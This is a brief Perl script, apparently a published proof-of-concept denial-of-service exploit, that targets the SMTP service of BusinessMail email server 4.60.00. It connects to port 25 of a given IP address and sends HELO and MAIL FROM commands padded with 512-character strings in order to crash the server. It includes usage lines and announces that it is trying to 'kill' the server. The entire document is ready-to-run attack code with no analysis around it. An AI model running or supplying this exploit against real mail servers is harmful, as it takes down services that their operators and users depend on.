#===== Start BusMail_SMTPDOS.pl =====
#
# Usage: BusMail_SMTPDOS.pl <ip>
#        BusMail_SMTPDOS.pl 127.0.0.1
#
# BusinessMail email server system 4.60.00
#
# Download:
# http://www.netcplus.com/
#
##########################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "25",
                                    Proto    => "TCP"))
{
        print "Attempting to kill BusinessMail SMTP server at $ARGV[0]:25...\n";

        sleep(1);

        print $socket "HELO " . "A" x 512 . "\r\n";

        sleep(1);

        print $socket "MAIL FROM:" . "A" x 512 . "\r\n";

        close($socket);
}
else
{
        print "Cannot connect to $ARGV[0]:25\n";
}
#===== Start BusMail_SMTPDOS.pl =====

